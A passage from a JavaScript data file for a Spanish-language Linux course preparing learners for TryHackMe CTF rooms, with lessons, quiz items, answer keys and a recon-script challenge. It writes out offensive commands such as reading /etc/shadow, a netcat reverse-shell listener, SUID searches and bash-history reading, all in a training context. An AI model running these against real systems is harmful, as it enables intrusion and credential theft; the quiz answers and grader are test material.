          teoria: "THM hace preguntas específicas. Saber interpretar qué piden:\n\n• '¿Qué versión de Apache?' → nmap -sV | grep http\n• '¿Qué usuario no tiene contraseña?' → cat /etc/shadow | grep '!\\|*'\n• '¿Cuántos puertos abiertos?' → nmap | grep 'open' | wc -l\n• '¿Cuál es el contenido de user.txt?' → cat /home/usuario/user.txt\n• '¿Cuál es el UID del usuario john?' → id john o grep john /etc/passwd\n• '¿Qué shell usa el usuario?' → grep usuario /etc/passwd | cut -d: -f7",
          ejemplo: {
            codigo: "# Pregunta: ¿Qué versión de OpenSSH corre?\n$ nmap -sV 10.10.10.1 | grep ssh\n22/tcp open  ssh  OpenSSH 7.6p1\n# Respuesta: OpenSSH 7.6p1\n\n# Pregunta: ¿Cuál es el UID de john?\n$ id john\nuid=1001(john) gid=1001(john)\n# Respuesta: 1001\n\n# Pregunta: ¿Qué hash algorithm usa /etc/shadow?\n$ sudo cat /etc/shadow | head -1\nroot:$6$salt$hash...\n# $6$ = SHA-512, $1$ = MD5, $5$ = SHA-256\n# Respuesta: SHA-512",
            output: "22/tcp open  ssh  OpenSSH 7.6p1\nuid=1001(john) gid=1001(john)\nroot:$6$salt$hash..."
          },
          pregunta: "En /etc/shadow ves: john:$1$salt$hash:18000... ¿Qué algoritmo de hash usa la contraseña de john?",
          opciones: ["SHA-512", "SHA-256", "MD5", "bcrypt"],
          correcta: 2,
          explicacion: "El prefijo en los hashes de /etc/shadow indica el algoritmo: $1$ = MD5, $5$ = SHA-256, $6$ = SHA-512, $2y$ = bcrypt, $y$ = yescrypt. En THM suelen preguntar esto. MD5 ($1$) es el más débil y fácil de crackear; SHA-512 ($6$) es más resistente pero hashcat con GPU puede crackearlo."
        },
        {
          id: "bash-5-16",
          titulo: "Steganografía básica",
          teoria: "En CTFs de forensics/stego, las flags están ocultas en imágenes, audio, etc.\n\nHerramientas básicas:\n• strings imagen.png | grep 'THM' → texto oculto\n• file imagen → tipo real del archivo\n• steghide extract -sf imagen.jpg → extraer datos ocultos\n• stegseek imagen.jpg wordlist → brute force steghide\n• exiftool imagen → metadata EXIF\n• binwalk imagen → archivos embebidos\n• zsteg imagen.png → análisis de canales de color",
          ejemplo: {
            codigo: "# Analizar imagen sospechosa:\n$ file mystery.jpg\nmystery.jpg: JPEG image data\n\n$ strings mystery.jpg | grep -i 'THM\\|flag\\|pass'\nTHM{h1dd3n_1n_m3t4d4t4}\n\n$ exiftool mystery.jpg\nImage Description: THM{3x1f_fl4g}\nComment: password=secreto\n\n$ steghide extract -sf mystery.jpg -p secreto\nwrote extracted data to 'hidden.txt'\n$ cat hidden.txt\nTHM{st3g0_fl4g}",
            output: "THM{h1dd3n_1n_m3t4d4t4}\nImage Description: THM{3x1f_fl4g}\nComment: password=secreto\nTHM{st3g0_fl4g}"
          },
          pregunta: "¿Qué herramienta extrae datos ocultos de una imagen con steganografía usando steghide?",
          opciones: [
            "strings imagen.jpg",
            "steghide extract -sf imagen.jpg",
            "binwalk imagen.jpg",
            "file imagen.jpg"
          ],
          correcta: 1,
          explicacion: "steghide extract -sf imagen.jpg extrae datos ocultos con steghide (puede necesitar contraseña con -p). strings solo muestra texto legible incrustado, binwalk encuentra archivos embebidos, file identifica el tipo. steghide es el método de stego más común en CTFs de nivel básico."
        },
        {
          id: "bash-5-17",
          titulo: "AttackBox vs VPN",
          teoria: "TryHackMe ofrece dos formas de acceder a las máquinas:\n\nAttackBox:\n✅ No necesitas configurar nada\n✅ Kali Linux en el navegador listo para usar\n✅ Ideal para empezar o si tienes problemas de VPN\n❌ Tiempo limitado (1 hora gratis/día en cuenta gratuita)\n❌ Más lento\n\nVPN (tu propio Kali):\n✅ Ilimitado\n✅ Más rápido\n✅ Puedes usar tus propias herramientas\n❌ Requiere configurar OpenVPN\n❌ Si falla la VPN, pierdes acceso\n\nPara comenzar: usa AttackBox. Cuando te sientas cómodo, configura VPN.",
          ejemplo: {
            codigo: "# Para usar AttackBox:\n# 1. En THM, clic en 'Start AttackBox'\n# 2. Esperar que cargue el Kali en pantalla dividida\n# 3. La IP de la víctima aparece en la tarea\n# 4. Abrir terminal en el AttackBox\n# 5. Ya puedes atacar directamente\n\n# Para usar VPN:\n$ sudo openvpn /ruta/a/tu_archivo.ovpn\n# Dejar corriendo en una terminal\n# Verificar: ip a | grep tun0\n# inet 10.8.X.X  ← esta es tu IP en THM\n\n# Diferencia clave para reverse shells:\n# AttackBox: usa la IP que muestra en pantalla\n# VPN: usa la IP de tun0",
            output: "2024 TUN/TAP device tun0 opened\n2024 Initialization Sequence Completed\ninet 10.8.123.45/17"
          },
          pregunta: "¿Cuál es la principal ventaja del AttackBox de THM para principiantes?",
          opciones: [
            "Es más rápido que la VPN",
            "No requiere configuración — Kali Linux listo para usar en el navegador",
            "Tiene más herramientas que Kali normal",
            "Permite usar más tiempo de máquina"
          ],
          correcta: 1,
          explicacion: "El AttackBox es un Kali Linux precargado en el navegador con todas las herramientas listas. No necesitas instalar nada ni configurar VPN. Para principiantes es perfecto porque elimina las barreras de configuración. La limitación es el tiempo (1 hora gratis/día), pero es suficiente para aprender."
        },
        {
          id: "bash-5-18",
          titulo: "Salas recomendadas para empezar",
          teoria: "Ruta recomendada de salas THM para tu nivel actual:\n\nNivel Básico (ya puedes hacer):\n• Linux Fundamentals 1, 2, 3 → terminal Linux\n• Introductory Networking → redes\n• Pre-Security Path → fundamentos\n\nNivel Intermedio (después de este path):\n• Vulnversity → subida de archivos, webshell\n• Basic Pentesting → metodología completa\n• Kenobi → FTP, SMB, SUID\n• RootMe → webshell + privilege escalation\n• Thompson → Tomcat WAR shell\n\nNivel Avanzado:\n• HackTheBox Easy machines\n• TryHackMe Rooms con rating 4+",
          ejemplo: {
            codigo: "# Orden recomendado:\n\n# Semana 1-2:\n# tryhackme.com/room/linuxfundamentals1\n# tryhackme.com/room/linuxfundamentals2\n# tryhackme.com/room/linuxfundamentals3\n\n# Semana 3-4:\n# tryhackme.com/room/vulnversity\n# tryhackme.com/room/basicpentestingjt\n\n# Semana 5-6:\n# tryhackme.com/room/kenobi\n# tryhackme.com/room/rootme\n\n# Después:\n# hackthebox.com - máquinas Easy (retiradas)\n# Preparación eJPT",
            output: "Progreso recomendado:\nLinux Fundamentals → Pre-Security → Jr Pentester Path\n↓\nVulnversity → BasicPentesting → Kenobi\n↓\nHTB Easy → eJPT → PNPT → OSCP"
          },
          pregunta: "¿Cuál es la sala de THM más recomendada para practicar subida de archivos y webshells?",
          opciones: ["Kenobi", "Thompson", "Vulnversity", "RootMe"],
          correcta: 2,
          explicacion: "Vulnversity es la sala estándar para aprender subida de archivos maliciosos y webshells en THM. Te enseña a bypassear filtros de extensiones y establecer reverse shells. Es parte del Jr Penetration Tester path oficial. Después de este Mundo 5, Vulnversity debería ser tu primera sala."
        },
        {
          id: "bash-5-19",
          titulo: "Documentar y reportar",
          teoria: "En pentesting profesional (y en CTFs de práctica) documentar es crucial:\n\n• Guarda TODOS los resultados de nmap\n• Screenshot de cada paso importante\n• Anota las credenciales encontradas\n• Guarda los exploits usados\n• Documenta la ruta de explotación\n\nHerramientas:\n• Obsidian / CherryTree → notas\n• Flameshot → screenshots\n• mkdir -p ctf/recon ctf/loot ctf/screenshots\n\nEn exámenes como OSCP, sin reporte no hay certificado.",
          ejemplo: {
            codigo: "# Estructura de carpetas para CTF:\nmkdir -p ctf_nombre_sala/{recon,loot,exploits,screenshots}\n\n# Guardar nmap:\nnmap -sC -sV -oN ctf_nombre_sala/recon/nmap.txt $IP\n\n# Guardar credenciales encontradas:\necho 'admin:password123 (from wp-config.php)' >> ctf_nombre_sala/loot/credentials.txt\n\n# Notas de progreso:\ncat > ctf_nombre_sala/notas.md << 'EOF'\n# CTF: Nombre_Sala\n## IP: 10.10.10.1\n## Puertos: 22, 80, 3306\n## Vector: SQLi en login.php\n## User flag: THM{us3r}\n## Root flag: THM{r00t}\nEOF",
            output: "ctf_nombre_sala/\n├── recon/nmap.txt\n├── loot/credentials.txt\n├── exploits/\n├── screenshots/\n└── notas.md"
          },
          pregunta: "¿Por qué es importante documentar cada paso en un CTF o pentest?",
          opciones: [
            "Solo para recordarlo después",
            "Para poder reproducir el ataque, escribir el reporte y demostrar el trabajo realizado",
            "Es solo un hábito, no tiene importancia práctica",
            "Para compartirlo en redes sociales"
          ],
          correcta: 1,
          explicacion: "La documentación es fundamental en pentesting profesional: necesitas reproducir el ataque para el reporte, demostrar que encontraste las vulnerabilidades con evidencia (screenshots, comandos), y escribir el reporte final. En OSCP sin documentación no hay certificado. En CTFs te ayuda a recordar tu metodología y mejorar."
        },
        {
          id: "bash-5-20",
          titulo: "Resumen Final — THM Ready",
          teoria: "¡Completaste el Path completo de Terminal Linux!\n\n✅ Mundo 1: Navegación básica\n✅ Mundo 2: Archivos y permisos\n✅ Mundo 3: Pipes y filtros\n✅ Mundo 4: Red y conectividad\n✅ Mundo 5: THM Ready\n\nAhora puedes:\n🔐 Navegar cualquier sistema Linux\n🔍 Buscar y analizar archivos\n🔧 Procesar y filtrar datos\n🌐 Usar herramientas de red\n🏴 Resolver salas básicas/intermedias de THM\n\nSiguientes pasos:\n→ Salas THM: Linux Fundamentals, Vulnversity\n→ CTF Simulator en HACKFORGE (próximamente)\n→ eJPT → PNPT → OSCP",
          ejemplo: {
            codigo: "# Tu arsenal completo para THM:\n\n# === RECONOCIMIENTO ===\nnmap -sC -sV -oN nmap.txt $IP\nnmap -p- --min-rate=5000 $IP\n\n# === ENUMERACIÓN ===\ngobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt\ncurl http://$IP/robots.txt\nenum4linux -a $IP\n\n# === EXPLOTACIÓN ===\nnc -lnvp 4444  # listener\nsearchsploit nombre_servicio version\n\n# === POST-EXPLOTACIÓN ===\nid && sudo -l && find / -perm -4000 2>/dev/null && cat ~/.bash_history\n./linpeas.sh\n\n# === FLAGS ===\ncat /home/*/user.txt 2>/dev/null\ncat /root/root.txt 2>/dev/null",
            output: "22/tcp open ssh\n80/tcp open http\n/admin/ (Status: 200)\nuid=0(root) gid=0(root)\nTHM{y0u_4r3_tHM_r34dy}"
          },
          pregunta: "Después de completar este path, ¿cuál debería ser tu primera sala en TryHackMe?",
          opciones: ["Una máquina Hard de HTB", "Vulnversity en THM", "OSCP directamente", "Metasploitable 3"],
          correcta: 1,
          explicacion: "Vulnversity es la progresión natural después de dominar los fundamentos de terminal Linux. Aplica todo lo aprendido: nmap, gobuster, subida de archivos, webshells, reverse shells y privilege escalation básico. Es parte del Jr Penetration Tester path oficial de THM y es la sala que conecta la teoría con la práctica real."
        }
      ],
      desafio: {
        titulo: "Desafío Final — Script THM Complete",
        descripcion: "Crea el script de pentesting más completo que hayas escrito. Debe simular las primeras fases de un CTF real.",
        instrucciones: [
          "El script acepta IP como argumento con validación",
          "Crea estructura de directorios: recon/, loot/, exploits/",
          "Ejecuta nmap -sC -sV y guarda en recon/nmap_initial.txt",
          "Extrae y muestra los puertos abiertos del resultado",
          "Verifica si el puerto 80 está abierto y si es así, descarga /robots.txt con curl",
          "Crea un archivo recon/checklist.txt con los próximos pasos basado en los puertos encontrados",
          "Muestra resumen final con todos los archivos creados"
        ],
        solucion: `#!/bin/bash

# Validar argumento
if [ $# -lt 1 ]; then
    echo "[-] Uso: $0 <IP>"
    echo "[-] Ejemplo: $0 10.10.10.1"
    exit 1
fi

IP=$1
echo "[*] HACKFORGE CTF RECON - $IP"
echo "================================"

# Crear estructura
mkdir -p ctf_IP/{recon,loot,exploits}
echo "[+] Workspace creado: ctf_$IP/"

# Nmap
echo "[*] Ejecutando nmap..."
nmap -sC -sV $IP -oN ctf_IP/recon/nmap_initial.txt 2>/dev/null

# Mostrar puertos
echo ""
echo "[+] Puertos abiertos:"
grep '/tcp' ctf_IP/recon/nmap_initial.txt | grep 'open'

# Verificar puerto 80
if grep -q '80/tcp.*open' ctf_IP/recon/nmap_initial.txt; then
    echo ""
    echo "[*] Puerto 80 detectado. Descargando robots.txt..."
    curl -s http://$IP/robots.txt > ctf_IP/recon/robots.txt 2>/dev/null
    echo "[+] robots.txt guardado"
fi

# Checklist
cat > ctf_IP/recon/checklist.txt << EOF
CTF Checklist para $IP
======================
[ ] Revisar robots.txt
[ ] Gobuster en puerto 80
[ ] Verificar FTP anonimo si puerto 21
[ ] enum4linux si puerto 445
[ ] Buscar exploits por versiones detectadas
[ ] Establecer reverse shell
[ ] Ejecutar linpeas
[ ] sudo -l, SUID, crontab
[ ] Leer user.txt y root.txt
EOF

echo ""
echo "[+] Checklist creado"
echo "[+] Resumen de archivos:"
ls -la ctf_IP/recon/
echo "[+] Completado."`,
        test: (codigo) => {
          return codigo.includes("#!/bin/bash") &&
                 codigo.includes("$1") &&
                 codigo.includes("mkdir") &&
                 codigo.includes("nmap") &&
                 codigo.includes("grep") &&
                 codigo.includes("curl") &&
                 codigo.includes("echo");
        }
      }
    }
  ]
};

export default TERMINAL_PATH;
